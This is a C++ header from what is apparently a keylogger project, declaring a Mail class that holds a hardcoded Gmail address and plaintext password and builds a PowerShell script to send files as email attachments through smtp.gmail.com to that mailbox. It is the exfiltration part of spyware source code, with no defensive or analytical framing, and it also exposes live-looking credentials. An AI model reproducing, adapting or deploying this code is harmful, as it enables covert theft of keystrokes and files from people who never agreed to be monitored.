#pragma once
#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>
#include "InputOutup.h"
#include "Timer.h"
#include "CurrentTimeDate.h"

using namespace std;

class Mail
{
private:
	Timer _timer;
	CurrentTimeDate _time;
	const string _addressTo = "keylogfrom2018@gmail.com";
	const string _addressFrom = "keylogfrom2018@gmail.com";
	const string _passwordFrom = "30042018keylog";
	const string &PowerShellScript =
		"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
		" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(this->_addressTo) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(this->_passwordFrom) +
		"\""
		" -From \"" +
		std::string(this->_addressFrom) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";


public:
	string replaceString(string sourse, const string &data, const string &with);
	bool checkFileExists(const string &name);
	bool createScript();
	int sendMail(const string & subject, const string & body, const string & attachments);
	int sendMail(const string & subject, const string & body, const vector<string>& att);
	Mail();
	~Mail();
};

